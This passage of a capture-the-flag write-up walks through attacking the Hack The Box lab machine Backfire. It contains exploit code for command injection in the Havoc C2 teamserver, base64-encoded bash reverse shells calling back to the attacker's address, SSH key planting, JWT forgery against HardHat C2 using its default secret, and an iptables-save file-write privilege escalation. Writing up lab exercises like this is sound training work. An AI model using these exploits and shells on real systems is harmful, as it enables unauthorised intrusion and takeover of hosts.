+</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Headers</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">HostHeader</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostRotation</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">round-robin</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Hosts</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortConn</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Protocol</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Https</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Proxy Enabled</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Secure</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Status</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">online</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Uris</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">UserAgent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><span class="sh">"</span><span class="p">},</span><span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span><span class="mi">1</span><span class="p">},</span><span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">08:39:18</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span>
+<span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Finally, the command injection message. I’ll use the code from the POC again, updating it to take <code class="language-plaintext highlighter-rouge">args.cmd</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># injection
+</span><span class="n">injection</span> <span class="o">=</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\\\\\\"</span><span class="s"> -mbla; </span><span class="sh">"""</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> 1&gt;&amp;2 &amp;&amp; false #</span><span class="sh">"""</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">AgentType</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Demon</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Arch</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">x64</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Config</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">{</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Amsi/Etw Patch</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Indirect Syscall</span><span class="se">\"</span><span class="s">: false,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Injection</span><span class="se">\"</span><span class="s">: {</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Alloc</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Execute</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Spawn32</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">SysWOW64</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Spawn64</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"\n</span><span class="s">    },</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Jitter</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Proxy Loading</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None (LdrLoadDll)</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Service Name</span><span class="se">\"</span><span class="s">:</span><span class="se">\"</span><span class="sh">"</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">2</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep Jmp Gadget</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep Technique</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">WaitForSingleObjectEx</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Stack Duplication</span><span class="se">\"</span><span class="s">: false</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Format</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Windows Service Exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Listener</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:39:04</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span>
+<span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="execution">Execution</h4>
+<p>I’ll run this with a simple <code class="language-plaintext highlighter-rouge">ping</code> command to see if it works, using the creds from the <a href="/2025/06/07/htb-backfire.html#http---tcp-8000">config above</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> rce.py requests pycryptodome
+<span class="go">Updated `rce.py`
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> rce.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056 <span class="nt">-U</span> ilya <span class="nt">-P</span> <span class="s1">'CobaltStr1keSuckz!'</span> <span class="nt">-c</span> <span class="s1">'ping -c 1 10.10.14.6'</span>
+<span class="go">Installed 6 packages in 9ms
+[***] Trying to register agent...
+[***] Success!
+[***] Trying to open socket on the teamserver...
+[***] Success!
+[***] Trying to write to the socket
+...[snip]...
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">tcpdump</code>, there’s ICMP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+15:45:42.762075 IP 10.10.11.49 &gt; 10.10.14.6: ICMP echo request, id 6302, seq 1, length 64
+15:45:42.762109 IP 10.10.14.6 &gt; 10.10.11.49: ICMP echo reply, id 6302, seq 1, length 64
+</span></code></pre></div></div>
+<p>That’s RCE!</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll try <code class="language-plaintext highlighter-rouge">-c 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'</code>, but it doesn’t work. That’s not surprising, given the amount of times the data is processed and passed on and the special characters. I’ll base64 encode that payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+<span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash  -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+<span class="go">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash  -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 '</span> | <span class="nb">base64</span>
+<span class="go">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK
+</span></code></pre></div></div>
+<p>Any of these would probably work, but I like to add spaces to get rid of special characters.</p>
+<p>Now I’ll send this as the payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run rce.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056 <span class="nt">-U</span> ilya <span class="nt">-P</span> <span class="s1">'CobaltStr1keSuckz!'</span> <span class="nt">-c</span> <span class="s1">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash'</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.49 40244
+bash: cannot set terminal process group (6324): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">ilya@backfire:~/Havoc/payloads/Demon$</span><span class="w">
+</span></code></pre></div></div>
+<p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">886b281d************************
+</span></code></pre></div></div>
+<h4 id="ssh">SSH</h4>
+<p>The shell is a bit flaky, dying sometimes without warning. I’ll add an SSH key to <code class="language-plaintext highlighter-rouge">/home/ilya/.ssh/authorized_keys</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;&gt;</span> .ssh/authorized_keys
+</code></pre></div></div>
+<p>And now connect using SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen ilya@10.10.11.49
+<span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
+</span><span class="gp">ilya@backfire:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-sergej">Shell as sergej</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>In ilya’s home directory there are a few files besides <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">ls</span> 
+<span class="go">files  hardhat.txt  Havoc  user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">files</code> has the same files as what’s hosted on the port 8000 webserver. <code class="language-plaintext highlighter-rouge">Havoc</code> is the installation of Havoc. <code class="language-plaintext highlighter-rouge">hardhat.txt</code> says:</p>
+<blockquote>
+<p>Sergej said he installed HardHatC2 for testing and not made any changes to the defaults
+I hope he prefers Havoc bcoz I don’t wanna learn another C2 framework, also Go &gt; C#</p>
+</blockquote>
+<p>There is a <code class="language-plaintext highlighter-rouge">sergej</code> directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ilya  sergej
+</span></code></pre></div></div>
+<p>ilya doesn’t have access. These users match the users with shells in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+ilya:x:1000:1000:ilya,,,:/home/ilya:/bin/bash
+sergej:x:1001:1001:,,,:/home/sergej:/bin/bash
+</span></code></pre></div></div>
+<h4 id="network">Network</h4>
+<p>There are many listening ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/$</span><span class="w"> </span>netstat <span class="nt">-tnl</span>
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN 
+</span></code></pre></div></div>
+<ul>
+<li>8000 is the webserver serving files from <code class="language-plaintext highlighter-rouge">/var/www/files</code> (as can be seen in <code class="language-plaintext highlighter-rouge">/etc/nginx/conf.d/tcp_8000.conf</code>)</li>
+<li>8443 is where Havoc is actually listening, and nginx is forwarding it from 443 (as can be seen in <code class="language-plaintext highlighter-rouge">/etc/nginx/conf.d/havoc.conf</code>).</li>
+<li>5000 and 7096 were filtered from the outside, so I’ll want to look at these.</li>
+<li>443 is the outward-facing Havoc server.</li>
+<li>22 is SSH</li>
+<li>40056 is the Havoc management port.</li>
+</ul>
+<h4 id="processes">Processes</h4>
+<p>The most interesting processes at this point belong to sergej, who is running Hardhat:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ilya@backfire:/$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>sergej
+<span class="go">sergej      6921  3.0  6.5 274271224 259772 ?    Ssl  16:00   0:12 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
+sergej      6922  2.6  6.4 274262820 258032 ?    Ssl  16:00   0:11 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
+sergej      6979  2.1  3.3 274203412 131524 ?    Sl   16:00   0:08 /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer
+sergej      6992  1.2  3.2 274195036 131112 ?    Sl   16:00   0:05 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client
+</span></code></pre></div></div>
+<h3 id="hardhat">Hardhat</h3>
+<h4 id="local">Local</h4>
+<p><a href="https://github.com/DragoQCC/HardHatC2">Hardhat C2</a> is an open source C# C2 framework. The note from ilya says that sergej didn’t change anything. The default config file is located <a href="https://github.com/DragoQCC/HardHatC2/blob/74a86e6680309c7e192826a7ceff6642501e81a7/TeamServer/appsettings.json">on GitHub</a>:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"Logging"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"LogLevel"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"Default"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Information"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Microsoft"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Warning"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Microsoft.Hosting.Lifetime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Information"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"AllowedHosts"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Jwt"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"Key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jtee43gt-6543-2iur-9422-83r5w27hgzaq"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Issuer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hardhatc2.com"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"IPWhitelistOptions"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"Whitelist"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">"*"</span><span class="p">]</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>The JWT secret is hardcoded. If it wasn’t modified, I can forge an account.</p>
+<p>I’ll clone the repo and run <code class="language-plaintext highlighter-rouge">docker compose up</code> to get a local copy running. It tells me the servers are running on 5000 and 7096, and then gives the login information for this instance:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">hardhat_server  |     Username: HardHat_Admin
+hardhat_server  |     Password: p3svHI=s-R@*7DfRr*u5
+</span></code></pre></div></div>
+<p>I’ll open <code class="language-plaintext highlighter-rouge">https://localhost:7096</code> and log in with those creds.</p>
+<p>There’s not a ton going on here, but the “Admin Dashboard” does allow me to create a new user:</p>
+<picture>
+<source srcset="/img/image-20250124162105885.webp" type="image/webp"/>
+<img alt="image-20250124162105885" class="include_image" loading="lazy" src="/img/image-20250124162105885.png"/>
+</picture>
+<p>Logging in as this user, there’s a ton more functionality, including a terminal:</p>
+<picture>
+<source srcset="/img/image-20250124162317629.webp" type="image/webp"/>
+<img alt="image-20250124162317629" class="include_image" loading="lazy" src="/img/image-20250124162317629.png"/>
+</picture>
+<p>I can list the local Docker hostname and user.</p>
+<h4 id="token">Token</h4>
+<p>Before shutting down my Docker container, I’ll look at how the tokens are stored. There’s no cookies for the site, but there are values in Local Storage:</p>
+<picture>
+<source srcset="/img/image-20250124162430127.webp" type="image/webp"/>
+<img alt="image-20250124162430127" class="include_image" loading="lazy" src="/img/image-20250124162430127.png"/>
+</picture>
+<p>I’ll log out as 0xdf and back in as HardHat_Admin. This user should exist on Backfire as well, and if the JWT secrets are the same, then the token generated here will work there as well:</p>
+<picture>
+<source srcset="/img/image-20250124162551833.webp" type="image/webp"/>
+<img alt="image-20250124162551833" class="include_image" loading="lazy" src="/img/image-20250124162551833.png"/>
+</picture>
+<h4 id="remote">Remote</h4>
+<p>I’ll kill the Docker and add SSH tunnels to access ports 5000 and 7096:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen ilya@10.10.11.49 <span class="nt">-L</span> 5000:127.0.0.1:5000 <span class="nt">-L</span> 7096:127.0.0.1:7096
+<span class="go">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
+...[snip]...
+</span><span class="gp">ilya@backfire:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>Now when I open <code class="language-plaintext highlighter-rouge">https://127.0.0.1:7096/Settings</code>, it loads! I didn’t even have to change the cookies since both sites were accessed at the same place. Because the same shared secret is in use, the token just works.</p>
+<picture>
+<source srcset="/img/image-20250124162826075.webp" type="image/webp"/>
+<img alt="image-20250124162826075" class="include_image" loading="lazy" src="/img/image-20250124162826075.png"/>
+</picture>
+<p>I’ll create a user with Team Lead role and log in. At the terminal, I’ll see the hostname:</p>
+<picture>
+<source srcset="/img/image-20250124163007485.webp" type="image/webp"/>
+<img alt="image-20250124163007485" class="include_image" loading="lazy" src="/img/image-20250124163007485.png"/>
+</picture>
+<p>I’ll issue a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+<picture>
+<source srcset="/img/image-20250124163052440.webp" type="image/webp"/>
+<img alt="image-20250124163052440" class="include_image" loading="lazy" src="/img/image-20250124163052440.png"/>
+</picture>
+<p>It connects to my listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.49 58572
+bash: cannot set terminal process group (8128): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">sergej@backfire:~/HardHatC2/HardHatC2Client$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade the shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">sergej@backfire:~$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">sergej@backfire:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>sergej has <code class="language-plaintext highlighter-rouge">sudo</code> permissions to run <code class="language-plaintext highlighter-rouge">iptables</code> and <code class="language-plaintext highlighter-rouge">iptables-save</code> as root on Backfire:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for sergej on backfire:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User sergej may run the following commands on backfire:
+    (root) NOPASSWD: /usr/sbin/iptables
+    (root) NOPASSWD: /usr/sbin/iptables-save
+</span></code></pre></div></div>
+<h3 id="file-write">File Write</h3>
+<h4 id="strategy-2">Strategy</h4>
+<p><code class="language-plaintext highlighter-rouge">man iptables-save</code> shows there’s a <code class="language-plaintext highlighter-rouge">-f</code> option:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:~$</span><span class="w"> </span>man iptables-save
+<span class="go">...[snip]...
+       -f, --file filename
+              Specify a filename to log the output to. If not specified, ipta‐
+              bles-save will log to STDOUT.
+...[snip]...
+</span></code></pre></div></div>
+<p>This means I can write as root if I can get what I want to write into an iptables rule.</p>
+<h4 id="write-comment">Write Comment</h4>
+<p><a href="https://www.cyberciti.biz/faq/how-to-add-comments-to-iptables-rules-on-linux/">This article</a> shows how to put a comment into an iptables rule. I’ll test it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s2">"test"</span>
+<span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables-save 
+<span class="c"># Generated by iptables-save v1.8.9 (nf_tables) on Fri Jan 24 16:41:42 2025
+</span><span class="go">*filter
+:INPUT ACCEPT [5331:11868675]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [6968:23797449]
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -i lo -m comment --comment test
+COMMIT
+</span><span class="c"># Completed on Fri Jan 24 16:41:42 2025
+</span></code></pre></div></div>
+<p>I would like the comment to start on a new line. I’ll add a new line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sergej@backfire:/$</span><span class="w"> </span><span class="nb">sudo </span>iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-m</span> comment <span class="nt">--comment</span> <span class="s1">$'</span><span class="se">\n</span><span class="s1">test</span><span class="se">\n</span><span class="s1">'</span>
